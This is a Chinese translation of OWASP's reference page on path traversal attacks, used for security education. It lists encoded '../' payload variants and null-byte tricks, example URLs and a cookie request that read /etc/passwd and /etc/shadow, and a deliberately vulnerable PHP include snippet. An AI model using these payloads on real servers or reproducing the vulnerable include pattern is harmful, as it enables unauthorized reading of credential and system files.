[TOC]

最新版本 (mm/dd/yy): 10/6/2015_ 翻译自[Path Traversal](https://www.owasp.org/index.php/Path_Traversal "Path Traversal")

概览
==

路径遍历攻击（也称作目录遍历）的目标是访问web根目录外存储的文件和目录。通过操纵使用“点-斜线（../）”序列及其变体引用文件的变量或使用绝对文件路径，可以访问存储在文件系统上的任意文件和目录，包括应用程序源代码或配置和关键的系统文件。应该注意的是，对文件的访问受到系统操作访问控制的限制（例如在Microsoft Windows操作系统上锁定或使用中的文件）。这种攻击也被称为“点点斜线”，“目录遍历”，“目录爬升”和“回溯”。

相关安全活动
======

如何避免路径遍历漏洞
----------

请参阅关于如何[避免路径遍历漏洞](https://www.owasp.org/index.php/File_System#Path_traversal "避免路径遍历漏洞")的[OWASP指南](https://www.owasp.org/index.php/Category:OWASP_Guide_Project "OWASP指南")文章。

如何测试路径遍历漏洞
----------

有关如何[测试路径遍历漏洞](https://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001) "测试路径遍历漏洞")的信息，请参阅[OWASP测试指南](https://www.owasp.org/index.php/Category:OWASP_Testing_Project "OWASP测试指南")文章。

漏洞描述
====

请求变化
----

### 编码和再编码

    %2e%2e%2f represents ../
    %2e%2e/ represents ../
    ..%2f represents ../ 
    %2e%2e%5c represents ..\
    %2e%2e\ represents ..\ 
    ..%5c represents ..\ 
    %252e%252e%255c represents ..\ 
    ..%255c represents ..\ 


诸如此类

### 百分比编码（又名URL编码）

请注意，Web容器对来自表单和URL的百分比编码值执行一级解码。

    ..%c0%af represents ../ 
    ..%c1%9c represents ..\ 


### OS特性

Unix： 根目录： “ / ” 目录分隔符：“/” Windows： 根目录：“<分区字母>：\\” 目录分隔符：“/”或“\\” 请注意，Windows允许文件名后面加上额外的.\ /字符。 在很多的操作系统中，可以注入空比特`%00`来截断文件名。例如，传递如下的参数 `?file=secret.doc%00.pdf` 将导致Java应用程序识别以“.pdf”结尾的字符串，操作系统将看到以“.doc”结尾的文件。 攻击者可以使用这个技巧绕过验证例程。

攻击示例
====

示例1
---

接下来的示例展现了应用是如何处理使用的资源的

     http://some_site.com.br/get-files.jsp?file=report.pdf  
     http://some_site.com.br/get-page.php?home=aaa.html  
     http://some_site.com.br/some-page.asp?page=index.html  


在这些示例中，可以插入恶意字符串作为变量参数来访问位于Web发布目录之外的文件。

      http://some_site.com.br/get-files?file=../../../../some dir/some file 
      http://some_site.com.br/../../../../some dir/some file 


接下来的URL展显了 *NIX 密码文件泄露

    http://some_site.com.br/../../../../etc/shadow  
    http://some_site.com.br/get-files?file=/etc/passwd 


注意：在Windows系统中，攻击者只能访问Web根目录位于的分区中，而在Linux中，他可以访问整个磁盘。

示例2
---

也有可能包含位于外部网站的文件或者脚本 `http://some_site.com.br/some-page?page=http://other-site.com.br/other-page.htm/malicius-code.php`

示例3
---

这个例子说明了攻击者是如何让服务器显示CGI源代码的。 `http://vulnerable-page.org/cgi-bin/main.cgi?file=main.cgi`

示例4
---

本示例摘录自维基百科-目录遍历 易受攻击的应用程序代码的典型示例是：

    <?php
    $template = 'blue.php';
    if ( is_set( $_COOKIE['TEMPLATE'] ) )
       $template = $_COOKIE['TEMPLATE'];
    include ( "/home/users/phpguru/templates/" . $template );
    ?>


通过以下的HTTP请求对系统发起攻击

    GET /vulnerable.php HTTP/1.0
    Cookie: TEMPLATE=../../../../../../../../../etc/passwd


收集如下的服务器响应:

    HTTP/1.0 200 OK
    Content-Type: text/html
    Server: Apache
    
    root:fi3sED95ibqR6:0:1:System Operator:/:/bin/ksh 
    daemon:*:1:1::/tmp: 
    phpguru:f8fk3j1OIf31.:182:100:Developer:/home/users/phpguru/:/bin/csh


于`/home/users/phpguru/templates/`后重复的 ../字符导致`include()`函数越过了root目录，然后包含了UNIX的密码文件 `/etc/passwd`。UNIX的`etc/passwd`是用来演示目录遍历的常用文件，因为破解者经常使用它来破解密码。

绝对路径遍历
------

接下来的URL包含此攻击的漏洞

    http://testsite.com/get.php?f=list
    http://testsite.com/get.cgi?f=2
    http://testsite.com/get.asp?f=test


攻击者可以通过这种方式执行攻击

    http://testsite.com/get.php?f=/var/www/html/get.php
    http://testsite.com/get.cgi?f=/var/www/html/admin/get.inc
    http://testsite.com/get.asp?f=/etc/passwd


当Web服务器返回有关Web应用程序中的错误的信息时，攻击者将更容易猜测正确的位置（例如，可能会显示源代码的文件路径）。

相关攻击代理
======

*   [类别：信息披露](https://www.owasp.org/index.php?title=Category:Information_Disclosure&action=edit&redlink=1 "类别：信息披露")

相关攻击方式
======

*   [资源注入](https://www.owasp.org/index.php/Resource_Injection "资源注入")

相关漏洞
====

*   [类别：输入验证漏洞](https://www.owasp.org/index.php/Category:Input_Validation_Vulnerability "类别：输入验证漏洞")

相关防御措施
======

*   [类别：输入验证](https://www.owasp.org/index.php/Category:Input_Validation "类别：输入验证")

参考
==

*   [http://cwe.mitre.org/data/definitions/22.html](http://cwe.mitre.org/data/definitions/22.html "http://cwe.mitre.org/data/definitions/22.html")
*   [http://www.webappsec.org/projects/threat/classes/path_traversal.shtml](http://www.webappsec.org/projects/threat/classes/path_traversal.shtml "http://www.webappsec.org/projects/threat/classes/path_traversal.shtml")